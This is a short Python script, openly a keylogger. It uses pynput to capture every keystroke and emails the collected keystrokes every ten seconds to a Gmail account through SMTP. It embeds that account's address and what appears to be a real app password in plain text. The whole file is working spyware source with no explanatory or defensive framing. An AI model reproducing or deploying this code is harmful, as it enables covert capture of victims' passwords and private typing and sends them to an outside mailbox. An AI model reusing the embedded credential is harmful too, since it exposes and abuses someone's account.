import pynput.keyboard as keyboard
import smtplib, threading

result = "[+] Keylogger Started"

def mail(message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login('Dineshmurugan278@gmail.com', 'zvwdhuvazjgddmpr')
    server.sendmail('dineshmurugan278@gmail.com', 'dineshmurugan278@gmail.com'," \n\n " + message)
    server.quit()

def res(key):
    global result
    try:
        result = result + key.char

    except AttributeError:
        reskey = key
        if(str(reskey) == "Key.space"):
            result = result + " "
        else:
            result = result + " " + str(reskey) + " "


def report():
    global result
    mail(result)
    result = ""
    timer = threading.Timer(10, report) # 10 sec
    timer.start()


with keyboard.Listener(on_press=res) as Listner:
    report()
    Listner.join()